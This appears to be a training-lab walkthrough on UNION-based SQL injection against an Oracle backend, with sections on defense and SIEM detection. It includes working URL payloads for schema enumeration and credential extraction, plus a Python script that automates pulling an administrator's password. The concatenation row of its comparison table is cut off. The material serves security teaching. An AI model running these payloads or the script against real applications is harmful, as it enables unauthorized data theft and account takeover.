# Lab Walkthrough: Listing Database Contents on Oracle

* **Vulnerability Type:** In-Band SQL Injection (UNION-Based)
* **Target Dialect:** Oracle Database
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 30–45 minutes
* **Lab Status:** Not Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [Cross-Engine Schema Enumeration Comparison](https://www.google.com/search?q=%25234-cross-engine-schema-enumeration-comparison&utm_source=gemini)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-python-poc&utm_source=gemini)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%25236-defense-hardening--secure-coding&utm_source=gemini)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%25237-siem-detection--telemetry-analysis&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

UNION-based SQL injection allows an attacker to append an independent `SELECT` statement to the application's original database query. Because the application reflects the database response in the HTTP response (e.g., rendering products on a page), the attacker can project internal database schema and records directly to the screen.

When attacking an **Oracle** database, attackers must navigate specific structural constraints that differ from standard ANSI SQL (MySQL/PostgreSQL):

* **The Mandatory `FROM` Clause:** Oracle rejects arbitrary `SELECT 1, 2` statements. Every query must pull from a table. To select literals or system variables, attackers must use Oracle's built-in dummy table: `FROM dual`.
* **Oracle System Catalog:** Oracle does not use the standard `information_schema`. Metadata is stored in proprietary views like `all_tables` and `all_tab_columns`.
* **Real-World Analogy:** UNION SQLi is like an executive assistant (the application) combining two reports for the boss. The assistant runs the official sales report (Query 1), but you sneak in a request to append the HR payroll spreadsheet (Query 2). The assistant staples them together (UNION) and hands the combined document to the boss (the HTTP response).

> **Learning Checkpoint 1:** Why do standard generic SQLi payloads (like `' UNION SELECT 1,2--`) fail on Oracle? Oracle's SQL parser strictly enforces the `FROM` keyword. Without `FROM dual`, the database immediately throws a syntax error (`ORA-00923`).

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** `GET /filter?category=<PAYLOAD>`
* **Primary Objective:** Map the Oracle database schema to locate a dynamically named users table, identify its column names, extract the `administrator` credentials, and log in.
* **Validation Signal:** The lab is solved when you successfully authenticate as the administrator.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Structure Probing & The `dual` Quirk

Before extracting data, you must align the injected query with the original query's column count and data types.

* Send an incremental payload series to find the column count, utilizing Oracle's `dual` table.
* **Payload:** `'+UNION+SELECT+'abc','def'+FROM+dual--`
* *Result:* The page renders "abc" and "def", confirming the query expects exactly **two columns**, both capable of holding text (VARCHAR2).

### Phase 2: Database Schema Extraction (Tables)

Query Oracle's metadata catalog to list all accessible tables in the database.

* **Payload:** `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
* *Action:* Scroll through the HTTP response in Burp Suite. Look for a custom business table that likely holds credentials.
* *Result:* You will find a randomized table name, e.g., `USERS_ABCDEF`.

### Phase 3: Database Schema Extraction (Columns)

To extract data, you need the exact names of the columns within the identified table. Query Oracle's column metadata view.

* **Crucial Detail:** In Oracle, string literals inside `WHERE` clauses are case-sensitive, and Oracle stores table names in UPPERCASE by default.
* **Payload:** `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
* *Result:* The response will list the columns for that table. Note the specific randomized column names, e.g., `USERNAME_ABCDEF` and `PASSWORD_ABCDEF`.

### Phase 4: Data Exfiltration & Account Takeover

Construct the final query to pull the actual credentials using the discovered table and column names.

* **Payload:** `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`
* *Action:* Locate the administrator's password in the response, navigate to `/login`, and authenticate.

> **Learning Checkpoint 2:** Why map the schema instead of just guessing `SELECT username, password FROM users`? In modern applications and CTF environments, developers and lab creators suffix table and column names with random hashes specifically to defeat brute-force guessing and automated SQLmap profiling. Schema enumeration guarantees precision.

---

## 4. Cross-Engine Schema Enumeration Comparison

Understanding dialect differences is a critical skill for an ethical hacker when fingerprinting backends.

| Action | Oracle | MySQL / PostgreSQL / MSSQL |
| --- | --- | --- |
| **Dummy Table** | `FROM dual` | *None required* (or `FROM information_schema.tables` if enforced) |
| **List Tables** | `SELECT table_name FROM all_tables` | `SELECT table_name FROM information_schema.tables` |
| **List Columns** | `SELECT column_name FROM all_tab_columns WHERE table_name='X'` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` |
| **Concatenation** | ` |  |

---

## 5. Automated Exploitation Script (Python PoC)

This script automates the tedious schema enumeration process against an Oracle backend, demonstrating how an attacker scales their methodology.

```python
#!/usr/bin/env python3
import requests
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_oracle_sqli(url):
    s = requests.Session()
    base_path = f"{url}/filter?category="
    
    print("[*] Phase 1: Querying all_tables for USERS table...")
    payload_tables = "' UNION SELECT table_name, NULL FROM all_tables--"
    res = s.get(base_path + payload_tables, verify=False)
    
    # Regex to find Oracle table (typically uppercase)
    table_match = re.search(r'(USERS_[A-Z0-9]+)', res.text, re.IGNORECASE)
    if not table_match:
        print("[-] Could not find USERS table. Check Oracle syntax.")
        sys.exit(1)
        
    users_table = table_match.group(1).upper()
    print(f"[+] Found users table: {users_table}")
    
    print("[*] Phase 2: Querying all_tab_columns...")
    # Oracle requires the table_name string literal to be UPPERCASE
    payload_columns = f"' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='{users_table}'--"
    res = s.get(base_path + payload_columns, verify=False)
    
    user_col_match = re.search(r'(USERNAME_[A-Z0-9]+)', res.text, re.IGNORECASE)
    pass_col_match = re.search(r'(PASSWORD_[A-Z0-9]+)', res.text, re.IGNORECASE)
    
    if not user_col_match or not pass_col_match:
        print("[-] Could not find target columns.")
        sys.exit(1)
        
    user_col = user_col_match.group(1).upper()
    pass_col = pass_col_match.group(1).upper()
    print(f"[+] Found columns: {user_col}, {pass_col}")
    
    print("[*] Phase 3: Extracting Administrator Credentials...")
    payload_data = f"' UNION SELECT {user_col}, {pass_col} FROM {users_table}--"
    res = s.get(base_path + payload_data, verify=False)
    
    admin_match = re.search(r'administrator.*?<td>(.*?)</td>', res.text, re.DOTALL | re.IGNORECASE)
    if admin_match:
        print(f"[+] EXPLOIT SUCCESSFUL!")
        print(f"[+] Administrator Password: {admin_match.group(1).strip()}")
    else:
        print("[-] Exploit executed, but could not parse admin password from DOM.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <TARGET_URL>")
        sys.exit(1)
    exploit_oracle_sqli(sys.argv[1].rstrip('/'))

```

---

## 6. Defense, Hardening & Secure Coding

To prevent UNION-based SQL injection, the application must separate SQL execution logic from user-supplied data strings.

* **Parameterized Queries (Prepared Statements):** This is the definitive fix. User input is treated as a literal value, preventing the Oracle engine from parsing injected `UNION` keywords.
* *Vulnerable (Java/JDBC):* `String query = "SELECT name FROM products WHERE category = '" + input + "'";`
* *Secure (Java/JDBC):*
```java
String query = "SELECT name FROM products WHERE category = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, input);

```




* **Database Account Hardening (Least Privilege):** The database user assigned to the web application should *not* have permissions to query system dictionaries like `all_tables` or `all_tab_columns` unless explicitly required by the framework's ORM.

---

## 7. SIEM Detection & Telemetry Analysis

Security teams can detect Oracle schema enumeration by monitoring HTTP traffic for specific Oracle system table calls.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined status=200 OR status=500
| eval decoded_uri=urldecode(uri_query)
| search decoded_uri="*UNION*SELECT*" AND (decoded_uri="*FROM*dual*" OR decoded_uri="*all_tables*" OR decoded_uri="*all_tab_columns*")
| stats count by src_ip, uri_path, decoded_uri, status
| where count > 0

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **`ORA-00923: FROM keyword not found where expected`** | Missing `FROM dual`. | Oracle requires a `FROM` clause. Ensure `+FROM+dual` is appended to all column-probing payloads. |
| **`ORA-01789: query block has incorrect number of result columns`** | Column count mismatch. | Your `UNION` payload has more or fewer columns than the original query. Adjust the number of `NULL` or `'abc'` values. |
| **Query succeeds but returns 0 schema rows** | Case sensitivity error. | In Oracle, `table_name='users_abcdef'` will fail. You must use exactly uppercase: `table_name='USERS_ABCDEF'`. |
| **`ORA-01790: expression must have same datatype...`** | Type mismatch. | You tried injecting a string (e.g., `table_name`) into a column strictly typed as an integer. Test each column position with string literals to map viable targets. |

---

## 9. References & Standards

* [PortSwigger: Examining the Database (SQLi)](https://www.google.com/search?q=https://portswigger.net/web-security/sql-injection/examining-the-database&utm_source=gemini)
* [Oracle SQL Language Reference: The DUAL Table](https://www.google.com/search?q=https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/The-DUAL-Table.html&utm_source=gemini)
* [OWASP Top 10-2021: A03 - Injection](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/&utm_source=gemini)

---

> **Key Insight:** Oracle's stringent ANSI SQL enforcement (requiring `FROM dual` and strict data typing) makes initial vulnerability discovery slightly more complex than MySQL, but its predictable metadata catalogs (`all_tables`, `all_tab_columns`) make automated, full-scale data extraction highly reliable once the initial payload structure is perfected.
